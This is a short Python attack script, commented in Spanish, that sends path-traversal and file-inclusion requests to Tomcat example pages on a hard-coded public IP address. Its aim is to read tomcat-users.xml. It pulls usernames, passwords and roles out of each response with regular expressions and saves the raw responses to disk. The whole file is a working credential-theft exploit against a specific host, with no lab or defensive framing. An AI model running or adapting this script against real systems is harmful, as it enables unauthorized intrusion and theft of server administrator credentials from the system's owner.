#!/usr/bin/env python3
# Script específico para extraer tomcat-users.xml

import requests
import re

def extract_tomcat_users():
    target = "189.254.143.102"
    session = requests.Session()
    session.verify = False
    
    print("[+] Buscando credenciales Tomcat Manager...")
    
    # Métodos directos para el archivo
    methods = [
        "/examples/jsp/include/include.jsp?page=WEB-INF/tomcat-users.xml",
        "/examples/jsp/include/include.jsp?page=conf/tomcat-users.xml",
        "/examples/jsp/include/include.jsp?page=../../../conf/tomcat-users.xml",
        "/examples/jsp/cal/cal2.jsp?time=....//....//conf/tomcat-users.xml",
        "/examples/jsp/snp/snoop.jsp?page=....//....//conf/tomcat-users.xml",
    ]
    
    for i, method in enumerate(methods):
        url = f"http://{target}{method}"
        print(f"🔍 Método {i+1}: {method}")
        
        try:
            r = session.get(url, timeout=10)
            
            # Buscar patrones específicos de tomcat-users.xml
            patterns = [
                r'<user [^>]*username="([^"]*)"[^>]*password="([^"]*)"[^>]*roles="([^"]*)"',
                r'username="([^"]*)"',
                r'password="([^"]*)"',
                r'roles="([^"]*)"',
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, r.text)
                if matches:
                    print(f"✅ ENCONTRADO: {matches}")
                    
            # Guardar respuesta completa
            with open(f"tomcat_attempt_{i+1}.html", "w", encoding='utf-8') as f:
                f.write(r.text)
                
        except Exception as e:
            print(f"❌ Error: {e}")
    
    print("\n[+] Revisa los archivos tomcat_attempt_*.html manualmente")

if __name__ == "__main__":
    extract_tomcat_users()